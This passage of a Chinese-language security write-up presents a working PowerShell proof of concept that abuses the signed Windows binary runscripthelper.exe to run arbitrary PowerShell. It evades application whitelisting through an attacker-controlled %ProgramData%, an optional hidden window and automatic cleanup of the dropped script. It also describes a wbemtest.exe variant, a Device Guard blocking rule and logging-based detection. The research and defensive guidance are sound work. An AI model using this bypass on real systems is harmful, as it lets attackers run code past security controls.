    #>
        [CmdletBinding()]
        [OutputType([System.Diagnostics.Process])]
        param (
            [Parameter(Mandatory = $True)]
            [ScriptBlock]
            $ScriptBlock,
            [String]
            [ValidateNotNullOrEmpty()]
            $RootDirectory = $PWD,
            [String]
            [ValidateNotNullOrEmpty()]
            $ScriptFileName = 'test.txt',
            [Switch]
            $HideWindow
        )
        $RunscriptHelperPath = "$Env:windirSystem32runscripthelper.exe"
        # Validate that runscripthelper.exe is present
        $null = Get-Item -Path $RunscriptHelperPath -ErrorAction Stop
        # Optional: Since not all systems will have runscripthelper.exe, you could compress and
        # encode the binary here and then drop it. That's up to you. This is just a PoC.
        $ScriptDirFullPath = Join-Path -Path (Resolve-Path -Path $RootDirectory) -ChildPath 'MicrosoftDiagnosisscripts'
        Write-Verbose "Script will be saved to: $ScriptDirFullPath"
        # Create the directory path expected by runscripthelper.exe
        if (-not (Test-Path -Path $ScriptDirFullPath)) {
            $ScriptDir = mkdir -Path $ScriptDirFullPath -ErrorAction Stop
        } else {
            $ScriptDir = Get-Item -Path $ScriptDirFullPath -ErrorAction Stop
        }
        $ScriptFullPath = "$ScriptDirFullPath$ScriptFileName"
        # Write the payload to disk - a requirement of runscripthelper.exe
        Out-File -InputObject $ScriptBlock.ToString() -FilePath $ScriptFullPath -Force
        $CustomProgramFiles = "ProgramData=$(Resolve-Path -Path $RootDirectory)"
        Write-Verbose "Using the following for %ProgramData%: $CustomProgramFiles"
        # Gather up all existing environment variables except %ProgramData%. We're going to supply our own, attacker controlled path.
        [String[]] $AllEnvVarsExceptLockdownPolicy = Get-ChildItem Env:* -Exclude 'ProgramData' | % { "$($_.Name)=$($_.Value)" }
        # Attacker-controlled %ProgramData% being passed to the child process.
        $AllEnvVarsExceptLockdownPolicy += $CustomProgramFiles
        # These are all the environment variables that will be explicitly passed on to runscripthelper.exe
        $StartParamProperties = @{ EnvironmentVariables = $AllEnvVarsExceptLockdownPolicy }
        $Hidden = [UInt16] 0
        if ($HideWindow) { $StartParamProperties['ShowWindow'] = $Hidden }
        $StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties
        $RunscriptHelperCmdline = "$RunscriptHelperPath surfacecheck \?$ScriptFullPath $ScriptDirFullPath"
        Write-Verbose "Invoking the following command: $RunscriptHelperCmdline"
        # Give runscripthelper.exe what it needs to execute our malicious PowerShell.
        $Result = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
            CommandLine = $RunscriptHelperCmdline
            ProcessStartupInformation = $StartParams
        }
        if ($Result.ReturnValue -ne 0) {
            throw "Failed to start runscripthelper.exe"
            return
        }
        $Process = Get-Process -Id $Result.ProcessId
        $Process
        # When runscripthelper.exe exits, clean up the script and the directories.
        # I'm using proper eventing here because if you immediately delete the script from
        # disk then it will be gone before runscripthelper.exe has an opportunity to execute it.
        $Event = Register-ObjectEvent -InputObject $Process -EventName Exited -SourceIdentifier 'RunscripthelperStopped' -MessageData "$RootDirectoryMicrosoft" -Action {
            Remove-Item -Path $Event.MessageData -Recurse -Force
            Unregister-Event -SourceIdentifier $EventSubscriber.SourceIdentifier
        }
    }
不使用PowerShell我们也能绕过应用程序白名单机制，比如，我们可以使用wbemtest.exe（该程序为WQL测试工具）完成这个任务，演示视频如下：  
在wbemtest.exe这个例子中，我的载荷存放在C:TestMicrosoftDiagnosisscriptstest.txt中。此外，我所使用的环境变量如下所示：
    “LOCALAPPDATA=C:\Test”
    “Path=C:\WINDOWS\system32;C:\WINDOWS”
    “SystemRoot=C:\WINDOWS”
    “SESSIONNAME=Console”
    “CommonProgramFiles=C:\Program Files\Common Files”
    “SystemDrive=C:”
    “TEMP=C:\Test”
    “ProgramFiles=C:\Program Files”
    “TMP=C:\Test”
    “windir=C:\WINDOWS”
    “ProgramData=C:\Test”
**三、防御措施**
如果使用的是Device Guard（现在是Windows Defender Application
Control），你可以在已有的策略中添加如下规则来阻止这个二进制文件，可参考[此链接](http://www.exploit-monday.com/2016/09/using-device-guard-to-mitigate-against.html)了解添加规则的具体步骤：
      10.0.0.0
      {A244370E-44C9-4C06-B551-F6016E563076}
      {2E07F7E4-194C-4D20-B7C9-6F44A6C5A234}
          Enabled:Unsigned System Integrity Policy
      0
**四、如何检测**
与其他PowerShell宿主进程一样，在脚本块（scriptblock）日志中会记录通过runscripthelper.exe执行PowerShell代码的动作，对应的事件为[4014事件](https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/)。
此外，“Windows PowerShell”日志中的400事件也会捕捉到runscripthelper.exe所对应的命令行上下文信息。
**五、何为runscripthelper.exe**
什么是runscripthelper.exe？该文件中的如下字符串引起了我的注意：
    InvokedFromUIF
    k_utcScriptPath
Google一番后，我发现UIF代表“User Initiated Feedback（用户发起的反馈）”，而UTF代表“Unified Telemetry
Client（统一遥测客户端）”。因此从字面上看，这个二进制文件是某种远程数据收集程序。为了避免微软向我的电脑推送并执行未经签名的PowerShell代码（并且这些代码很可能没有任何质量保证），我非常乐意在Device
Guard代码完整性策略中阻止这个二进制程序的运行。  
**  
**
**六、总结**
因此，本文分析的这个签名应用可以被攻击者恶意滥用，经过进一步分析，我们发现系统并没有限制这类程序的使用场景，因为每次Windows发布新版时都会引入新的应用程序。这个事实也再次证实应用白名单（application
whitelisting，AWL）仍然面临许多难题，其中一个基本的难题就是，如果我们想让一个可启动的、实用的系统保持最新状态，我们往往需要将经过微软签名的任何代码列入白名单中。这种决策会带来一些副作用，如果某些人在白名单维护方面态度非常严格，那么他们就需要实时关注像本文之类的文章，相应地更新黑名单规则。在白名单机制的基础上，使用这种黑名单规则可以取得很好的效果。然而想要维护这样一个黑名单并不是一件容易的事情，因为这个名单随着时间的推进会不断增长。需要明确的是，这一点并不是AWL的缺陷，只能算是AWL面临的一个挑战。我个人也会使用AWL，对这种机制的有效性也十分满意。绝大多数攻击者仍然会使用不可信的脚本或程序，在这种场景中，即使最基本的白名单策略应付起来也能游刃有余。
把AWL的事先放在一边不谈，单凭这类程序，攻击者就可以隐藏在良性的、“可信的”应用程序背后。因此，通过这个例子，我们需要总结出一个道理：白名单绕过技术是攻击者在后续攻击过程中的一大帮手，无论AWL机制是否存在，我们都应该对此有所警觉。
最后说一下，如果有人偶然发现微软向runscriphelper.exe推送了任何PowerShell代码，请上传这段代码并及时告诉我，不胜感激！